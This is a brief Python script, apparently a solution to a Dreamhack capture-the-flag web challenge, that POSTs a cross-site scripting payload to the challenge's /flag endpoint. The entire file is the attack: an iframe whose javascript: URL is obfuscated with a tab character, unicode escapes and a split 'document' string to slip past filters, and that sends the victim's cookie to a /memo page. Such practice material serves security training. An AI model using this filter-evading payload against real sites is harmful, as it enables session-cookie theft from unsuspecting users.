import requests


HOST = "http://host3.dreamhack.games:13861/flag"

data = {"param": ""}

payload = "<iframe src='java	script:loc\u0061ti\u006fn.href='/memo?memo='+parent['doc'+'ument']['cookie']>"

data['param'] = payload

res = requests.post(HOST, data)
print(res.text)

